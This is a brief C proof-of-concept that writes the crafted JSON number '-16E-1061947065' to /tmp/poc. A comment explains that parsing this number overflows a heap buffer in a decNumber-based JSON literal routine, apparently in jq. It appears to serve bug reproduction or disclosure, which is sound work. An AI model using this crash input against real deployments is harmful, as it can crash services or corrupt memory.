#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    /* The raw JSON string that triggers the heap-buffer-overflow.
       Parsing "-16E-1061947065" creates a decNumber with digits=2,
       then jvp_literal_number_literal allocates only digits+14=16 bytes,
       but decNumberToString writes the large exponent beyond that. */
    const char *json = "-16E-1061947065";
    
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    fwrite(json, 1, strlen(json), f);
    fclose(f);
    return 0;
}